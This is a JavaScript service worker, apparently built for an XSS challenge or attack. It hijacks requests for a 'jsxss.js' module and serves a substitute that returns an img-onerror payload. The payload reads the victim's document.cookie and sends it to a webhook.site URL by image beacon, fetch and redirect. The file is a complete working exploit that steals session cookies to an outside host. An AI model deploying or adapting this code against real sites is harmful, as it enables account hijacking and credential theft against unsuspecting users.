// Intercept cs.js's hardcoded jsxss import and return OUR module instead.
// Deterministic replacement for the flaky import-map remap.
const EXFIL = 'https://webhook.site/056e7430-69a4-41c7-94be-0c62d64375b2';

const MODULE = `
const EXFIL='${EXFIL}';
try{new Image().src=EXFIL+'/b?s=sw-module-loaded&t='+Date.now();}catch(e){}
const P='<img src=x onerror="'
 +'var c=encodeURIComponent(document.cookie);'
 +'new Image().src=\\'${EXFIL}/i?d=\\'+c;'
 +'fetch(\\'${EXFIL}/f?d=\\'+c,{mode:\\'no-cors\\'}).catch(function(){});'
 +'setTimeout(function(){location.href=\\'${EXFIL}/n?d=\\'+c},800);'
 +'">';
export default function(){ try{new Image().src=EXFIL+'/b?s=factory-called&t='+Date.now();}catch(e){} return P; }
`;

self.addEventListener('install', (e) => self.skipWaiting());
self.addEventListener('activate', (e) => e.waitUntil(self.clients.claim()));
self.addEventListener('fetch', (e) => {
  const u = e.request.url;
  if (u.includes('localhost:3000/jsxss.js') || u.endsWith('/jsxss.js')) {
    e.respondWith(new Response(MODULE, { headers: { 'content-type': 'text/javascript' } }));
  }
});
